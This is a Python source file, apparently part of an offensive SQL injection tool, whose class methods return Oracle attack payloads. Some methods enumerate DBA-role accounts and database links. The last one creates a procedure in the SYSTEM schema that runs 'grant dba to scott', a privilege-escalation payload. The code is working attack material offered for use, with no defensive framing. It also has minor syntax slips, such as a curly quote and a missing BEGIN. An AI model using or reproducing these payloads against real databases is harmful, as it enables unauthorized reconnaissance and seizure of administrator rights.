import os
import sys
current_directory = os.getcwd()

sys.path.append(current_directory)
from INFO.common import columns
from INFO.common import tables
from random import choice

class PrivillagePayloads:
    @staticmethod
    def DBA_username_payload(column=choice(columns),table=choice(tables)):
        payload = f"""
SELECT {column} FROM {table} WHERE granted_role='DBA';
 """
        retval = payload
        return retval
    
    @staticmethod
    def Database_link_info_payloads_default(table=choice(tables)):
        payload = f"""
	SELECT * FROM DBA_DB_LINKS
SELECT * FROM ALL_DB_LINKS
SELECT * FROM USER_DB_LINKS
 """
        retval = payload
        return retval
    
    @staticmethod
    def Database_link_info_payloads(table=choice(tables)):
        payload = f"""	
SELECT * FROM {table}
SELECT * FROM {table}
SELECT * FROM {table}"""
        retval = payload
        return retval
    
    @staticmethod
    def Procedure_payload():
        payload = f"""
CREATE OR REPLACE PROCEDURE “SYSTEM".netspi1 (id IN VARCHAR2)
AS
PRAGMA autonomous_transaction;
EXECUTE IMMEDIATE 'grant dba to scott';
COMMIT;
END;

BEGIN
SYSTEM.netspi1('netspi');
END; """
        retval = payload
        return retval
    